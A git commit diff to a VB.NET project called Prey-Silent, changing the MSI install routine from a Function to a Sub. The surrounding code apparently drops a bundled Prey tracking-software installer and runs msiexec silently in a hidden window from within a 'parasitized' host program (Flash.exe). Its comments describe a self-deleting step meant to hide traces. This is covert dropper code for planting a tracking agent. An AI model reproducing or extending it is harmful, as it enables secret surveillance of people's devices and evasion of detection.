3ecea7d6a30178658d0bc8830005eac69a79c3d7
Leon <Leon@LEONVO>
2017-12-13 21:19:14 +0800

    修复

--- Prey-Silent/ApplicationEvents.vb
+++ Prey-Silent/ApplicationEvents.vb
@@ -45,7 +45,7 @@ Namespace My
             If Not SaveResourceFile(My.Resources.BinaryResource.prey, PreyMSIPath) Then End
 
             '静默安装 Prey 服务
-            If Not InstallMSI() Then End
+            InstallMSI()
 
             '安装完毕后删除 MSI 安装程序
             If IO.File.Exists(PreyMSIPath) Then IO.File.Delete(PreyMSIPath)
@@ -109,7 +109,7 @@ Namespace My
         ''' 静默安装 Prey.msi
         ''' </summary>
         ''' <returns></returns>
-        Private Function InstallMSI() As Boolean
+        Private Sub InstallMSI()
             '静默安装：
             'msiexec.exe /i prey-windows-1.X.X-xxx.msi /lv installer.log /q AGREETOLICENSE=yes API_KEY=foobar123
             '安装完成后提示： "/q" 改为 "/qn+"
@@ -129,9 +129,7 @@ Namespace My
             End Try
             '宿主程序具有管理员权限，所以不需要使用 ShellExecute ，方便等待进程结束
             Shell(ShellCommand, AppWinStyle.Hide, True)
-            '使用 [被寄生程序] 是否存在作为返回值
-            Return IO.File.Exists(FlashDirectory & "Flash.exe")
-        End Function
+        End Sub
 
         ''' <summary>
         ''' 结束程序并自动删除自身，以隐藏痕迹
